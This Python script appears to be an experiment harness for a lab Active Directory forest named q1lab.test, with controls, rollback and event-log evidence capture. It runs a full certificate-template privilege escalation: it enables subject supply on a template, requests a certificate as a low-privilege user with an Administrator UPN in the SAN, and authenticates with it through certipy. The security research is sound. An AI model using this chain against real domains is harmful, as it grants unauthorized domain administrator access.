"""Fixed-CSR interventions in the independently provisioned q1lab.test forest.

CSR keys are generated in host memory with SHA-256 signatures; CA requests run
as the ordinary domain enroller. Public evidence is saved, private keys/TGTs are
not. The setup, domain, CA, account and request mechanism differ from ESSOS.
"""

import argparse
from datetime import datetime,timezone
import hashlib
import json
import os
from pathlib import Path
import random
import subprocess
import tempfile
import time
import xml.etree.ElementTree as ET

import winrm
from asn1crypto.core import UTF8String
from cryptography import x509
from cryptography.hazmat.primitives import hashes,serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import pkcs12,NoEncryption
from cryptography.x509.oid import NameOID,ObjectIdentifier

from .lab.provision_2019 import credentials,ENDPOINT
from .live_policy_matrix import ROOT,digest,dump
from scripts.capture_trace7_split_actor_delayed_pkinit import get_current_event_record_id,export_events_since,pull_file_winrm


def freeze(path,repeats):
    if path.exists():raise FileExistsError(path)
    trials=[]
    for block in range(repeats):
        conditions=["baseline_admin_san","enabled_admin_san","rollback_before_enroll","benign_self_enrollment"]
        random.Random(19019+block).shuffle(conditions)
        for condition in conditions:
            trials.append({"id":f"r{block+1:02d}_{condition}","condition":condition,"expected_admin_certificate":condition=="enabled_admin_san",
                           "requested_upn":"q1.enroller@q1lab.test" if condition=="benign_self_enrollment" else "administrator@q1lab.test"})
    sources=[Path(__file__),Path(__file__).with_name("live_policy_matrix.py"),Path(__file__).parent/"lab/provision_2019.py",
             ROOT/"scripts/capture_trace7_split_actor_delayed_pkinit.py"]
    dump(path,{"schema":1,"declared_utc":datetime.now(timezone.utc).isoformat(),"trials":trials,
        "scope":"Independent Windows 2019 q1lab.test configuration with controlled repeated interventions; no enterprise-prevalence estimate",
        "domain":"q1lab.test","ca":"Q1-Evidence-CA","template":"Q1Evidence","original_name_flag":33554432,
        "intervention":"original | 1; same signed administrative CSR/key within each block; identical CA cache/RPC readiness control",
        "request_signature_hash":"sha256","private_keys":"Host process memory and temporary mode-0600 PFX only",
        "source_sha256":{str(p.relative_to(ROOT)):digest(p) for p in sources}})


class IndependentRunner:
    def __init__(self,args):
        self.args=args;self.output=args.output;self.secret=credentials();self.cache={}
        def s(user,password):return winrm.Session(ENDPOINT,auth=(user,password),transport="ntlm",read_timeout_sec=60,operation_timeout_sec=50)
        self.admin=s("Q1LAB\\Administrator",self.secret["administrator_password"])
        self.enroller=s("Q1LAB\\q1.enroller",self.secret["enroller_password"])
        self.context=None

    def ps(self,session,name,script):
        before=time.time();mono=time.monotonic_ns()
        r=session.run_ps("$ErrorActionPreference='Stop';$ProgressPreference='SilentlyContinue'\n"+script)
        row={"host_before":before,"host_after":time.time(),"host_monotonic_elapsed_ns":time.monotonic_ns()-mono,
             "returncode":r.status_code,"stdout":r.std_out.decode("utf-8-sig",errors="replace"),"stderr":r.std_err.decode("utf-8-sig",errors="replace")}
        for value in self.secret.values():
            row["stdout"]=row["stdout"].replace(value,"<redacted>");row["stderr"]=row["stderr"].replace(value,"<redacted>")
        dump(self.output/(name+".json"),row)
        if r.status_code:raise RuntimeError("Failed phase "+name)
        return row

    def state(self,name):
        script="""$nc=(Get-ADRootDSE).configurationNamingContext
$dn='CN=Q1Evidence,CN=Certificate Templates,CN=Public Key Services,CN=Services,'+$nc
$t=Get-ADObject $dn -Properties *
@{dn=$dn;name_flag=[int]$t.'msPKI-Certificate-Name-Flag';enrollment_flag=$t.'msPKI-Enrollment-Flag';ra_signatures=$t.'msPKI-RA-Signature';eku=$t.pKIExtendedKeyUsage;sddl=$t.nTSecurityDescriptor.GetSecurityDescriptorSddlForm('All');template_oid=$t.'msPKI-Cert-Template-OID'} | ConvertTo-Json -Depth 5 -Compress"""
        result=self.ps(self.admin,name,script)
        dump(self.output/(name+"_effective_policy.json"),result)
        return json.loads(result["stdout"])

    def flag(self,name,value):
        self.ps(self.admin,name,"$nc=(Get-ADRootDSE).configurationNamingContext;Set-ADObject ('CN=Q1Evidence,CN=Certificate Templates,CN=Public Key Services,CN=Services,'+$nc) -Replace @{'msPKI-Certificate-Name-Flag'="+str(value)+"};'WRITE_COMPLETE'")

    def find(self):
        folder=self.output/"06_certipy_find";folder.mkdir()
        command=[self.args.certipy,"find","-u","q1.enroller@q1lab.test","-p",self.secret["enroller_password"],
            "-dc-ip","127.0.0.3","-target-ip","127.0.0.3","-dc-host",self.context["computer"]+".q1lab.test",
            "-ldap-scheme","ldap","-ldap-port","389","-dc-only","-json","-text","-output","certipy","-timeout","10"]
        start=time.perf_counter();r=subprocess.run(command,cwd=folder,capture_output=True,text=True,timeout=120)
        command[command.index("-p")+1]="<private environment>"
        stdout,stderr=r.stdout,r.stderr
        for value in self.secret.values():stdout=stdout.replace(value,"<redacted>");stderr=stderr.replace(value,"<redacted>")
        dump(folder/"execution.json",{"command":command,"returncode":r.returncode,"stdout":stdout,"stderr":stderr,"elapsed_seconds":time.perf_counter()-start,
             "scope":"Actual Certipy DC-only LDAP enumeration; no CA runtime configuration claim"})
        if r.returncode:raise RuntimeError("Actual Certipy enumeration failed")

    def trial(self,trial,root):
        self.output=root/trial["id"];self.output.mkdir()
        result={"id":trial["id"],"condition":trial["condition"],"status":"started","restored":False}
        boundary=None
        original=33554432
        try:
            context_script="""$d=Get-ADDomain;$u=Get-ADUser q1.enroller;$a=Get-ADUser Administrator
@{dns_root=$d.DNSRoot;domain_netbios=$d.NetBIOSName;domain_sid=$d.DomainSID.Value;admin_sid=$a.SID.Value;enroller_sid=$u.SID.Value;enroller_name=$u.SamAccountName;mutator_name=$a.SamAccountName;mutator_sid=$a.SID.Value;computer=$env:COMPUTERNAME;ca_name='Q1-Evidence-CA';template_name='Q1Evidence'} | ConvertTo-Json -Compress"""
            self.context=json.loads(self.ps(self.admin,"00_domain_context",context_script)["stdout"])
            self.ps(self.enroller,"00_requester_identity","whoami /user; whoami /groups")
            before=self.state("01_before_state")
            if before["name_flag"]!=original:raise RuntimeError("Unexpected independent baseline")
            boundary=get_current_event_record_id(self.admin)
            dump(self.output/"event_boundary.json",{"source":"Security","start_record_id":boundary})
            condition=trial["condition"]
            if condition!="baseline_admin_san":self.flag("02_enable_subject",original|1)
            if condition=="rollback_before_enroll":self.flag("03_rollback_before_enroll",original)
            self.state("04_assigned_state")
            self.ps(self.admin,"05_controlled_cache_refresh","Restart-Service CertSvc -Force; (Get-Service CertSvc).WaitForStatus('Running',[TimeSpan]::FromSeconds(30)); 'CA_RUNNING'")
            ca_config=self.context["computer"]+".q1lab.test\\Q1-Evidence-CA"
            ping="$ready=$false;for($i=0;$i -lt 15;$i++){certutil.exe -config '"+ca_config+"' -ping;if($LASTEXITCODE -eq 0){$ready=$true;break};Start-Sleep 2};if(-not $ready){throw 'ENROLLMENT_RPC_NOT_READY'};'RPC_READY'"
            self.ps(self.enroller,"05_lowpriv_rpc_readiness",ping)
            self.find()
            key_id=(trial["id"].split("_",1)[0],trial["requested_upn"])
            if key_id not in self.cache:
                key=rsa.generate_private_key(public_exponent=65537,key_size=2048)
                request=x509.CertificateSigningRequestBuilder().subject_name(x509.Name([x509.NameAttribute(NameOID.COMMON_NAME,"q1.enroller")])).add_extension(
                    x509.SubjectAlternativeName([x509.OtherName(ObjectIdentifier("1.3.6.1.4.1.311.20.2.3"),UTF8String(trial["requested_upn"]).dump())]),critical=False).sign(key,hashes.SHA256())
                self.cache[key_id]=(key,request.public_bytes(serialization.Encoding.PEM))
            key,csr_bytes=self.cache[key_id]
            (self.output/"request.csr").write_bytes(csr_bytes)
            dump(self.output/"request_binding.json",{"block":key_id[0],"requested_upn":key_id[1],"request_sha256":hashlib.sha256(csr_bytes).hexdigest(),"signature_hash":"sha256"})
            remote="C:\\Q1Evidence\\"+trial["id"]
            # A public PEM request is short enough for a single encoded command.
            import base64
            encoded=base64.b64encode(csr_bytes).decode()
            self.ps(self.admin,"08_stage_public_csr",f"[IO.File]::WriteAllBytes('{remote}.req',[Convert]::FromBase64String('{encoded}'))")
            if pull_file_winrm(self.admin,remote+".req")!=csr_bytes:raise ValueError("Public CSR transfer mismatch")
            submit=f"$p=Start-Process certreq.exe -ArgumentList '-submit -q -f -config \"{ca_config}\" -attrib \"CertificateTemplate:Q1Evidence\" {remote}.req {remote}.cer' -Wait -PassThru -NoNewWindow; 'SUBMIT_EXIT:'+ $p.ExitCode; 'CER_EXISTS:'+ (Test-Path '{remote}.cer')"
            row=self.ps(self.enroller,"09_submission",submit)
            import re
            match=re.search(r"SUBMIT_EXIT:(-?\d+)",row["stdout"])
            if not match:raise ValueError("No native request outcome")
            result["native_submission_exit"]=int(match.group(1))
            if result["native_submission_exit"] or "CER_EXISTS:True" not in row["stdout"]:
                result["status"]="ca_nonissuance_requires_adjudication";return result
            certificate_bytes=pull_file_winrm(self.admin,remote+".cer")
            (self.output/"issued_certificate.cer").write_bytes(certificate_bytes)
            try:cert=x509.load_der_x509_certificate(certificate_bytes)
            except ValueError:cert=x509.load_pem_x509_certificate(certificate_bytes)
            fmt=serialization.PublicFormat.SubjectPublicKeyInfo
            if key.public_key().public_bytes(serialization.Encoding.DER,fmt)!=cert.public_key().public_bytes(serialization.Encoding.DER,fmt):raise ValueError("Issued certificate differs from held CSR key")
            upns=[]
            for item in cert.extensions.get_extension_for_class(x509.SubjectAlternativeName).value:
                if isinstance(item,x509.OtherName) and item.type_id.dotted_string=="1.3.6.1.4.1.311.20.2.3":upns.append(UTF8String.load(item.value).native)
            identity={"serial":format(cert.serial_number,"x"),"sha1":cert.fingerprint(hashes.SHA1()).hex(),"sha256":cert.fingerprint(hashes.SHA256()).hex(),"upns":upns,"issuer":cert.issuer.rfc4514_string()}
            dump(self.output/"certificate_identity.json",identity)
            if condition in ("enabled_admin_san","benign_self_enrollment"):self.flag("11_rollback_after_issue",original)
            selected="administrator" if "administrator@q1lab.test" in [u.casefold() for u in upns] else "q1.enroller"
            with tempfile.TemporaryDirectory(prefix="goad-q1-independent-private-") as temporary:
                pfx=Path(temporary)/"issued.pfx";descriptor=os.open(pfx,os.O_CREAT|os.O_EXCL|os.O_WRONLY,0o600)
                with os.fdopen(descriptor,"wb") as target:target.write(pkcs12.serialize_key_and_certificates(b"auth",key,cert,None,NoEncryption()))
                start=time.monotonic_ns()
                auth=subprocess.run([self.args.certipy,"auth","-pfx",str(pfx),"-dc-ip","127.0.0.3","-username",selected,"-domain","q1lab.test","-no-hash","-no-save"],cwd=temporary,capture_output=True,text=True,timeout=90)
                dump(self.output/"13_certipy_auth.json",{"returncode":auth.returncode,"stdout":auth.stdout,"stderr":auth.stderr,"elapsed_ns":time.monotonic_ns()-start,"scope":"Diagnostics; raw matching KDC outcome determines successful use"})
            result.update(status="issued_auth_attempted",certificate_identity=identity,privileged_san_present="administrator@q1lab.test" in [u.casefold() for u in upns])
        except Exception as error:result.update(status="infrastructure_error",error=type(error).__name__+": "+str(error))
        finally:
            try:
                self.flag("99_restore_flag",original)
                result["restored"]=self.state("99_final_state")["name_flag"]==original
            except Exception as error:result["restoration_error"]=type(error).__name__+": "+str(error)
            try:
                if boundary is not None:
                    time.sleep(2)
                    raw=export_events_since(self.admin,boundary,(5136,4768,4624,4616,4886,4887,4888,4898,4899))
                    tree=ET.fromstring("<Events>"+raw+"</Events>")
                    ET.ElementTree(tree).write(self.output/"events.xml",encoding="utf-8",xml_declaration=True)
                    self.ps(self.admin,"99_ca_bridge","certutil -view -restrict 'Disposition=20' -out 'RequestID,RequesterName,SerialNumber,CertificateHash,CertificateTemplate' csv")
            except Exception as error:result["evidence_error"]=type(error).__name__+": "+str(error)
            dump(self.output/"outcome.json",result)
            dump(self.output/"manifest.json",{str(p.relative_to(self.output)):digest(p) for p in sorted(self.output.rglob("*")) if p.is_file() and p.name!="manifest.json"})
        return result


def run(args):
    protocol=json.loads(args.protocol.read_text())
    for name,expected in protocol["source_sha256"].items():
        if digest(ROOT/name)!=expected:raise ValueError("Frozen source changed: "+name)
    args.output.mkdir(parents=True,exist_ok=False);dump(args.output/"protocol.json",protocol)
    snapshots=args.output/"sources";snapshots.mkdir()
    for name in protocol["source_sha256"]:(snapshots/Path(name).name).write_bytes((ROOT/name).read_bytes())
    runner=IndependentRunner(args);results=[]
    for trial in protocol["trials"]:
        result=runner.trial(trial,args.output);results.append(result);dump(args.output/"progress.json",results)
        print(json.dumps({k:result.get(k) for k in ("id","status","restored","privileged_san_present","error")}),flush=True)
        if not result["restored"] or result["status"]=="infrastructure_error":break
    dump(args.output/"run_manifest.json",{"planned":len(protocol["trials"]),"attempted":len(results),"scope":protocol["scope"]})


if __name__=="__main__":
    parser=argparse.ArgumentParser();sub=parser.add_subparsers(dest="action",required=True)
    f=sub.add_parser("freeze");f.add_argument("protocol",type=Path);f.add_argument("--repeats",type=int,default=3)
    r=sub.add_parser("run");r.add_argument("protocol",type=Path);r.add_argument("output",type=Path);r.add_argument("--certipy",required=True)
    args=parser.parse_args()
    if args.action=="freeze":
        if args.repeats<1:parser.error("Positive repetitions required")
        freeze(args.protocol,args.repeats)
    else:run(args)
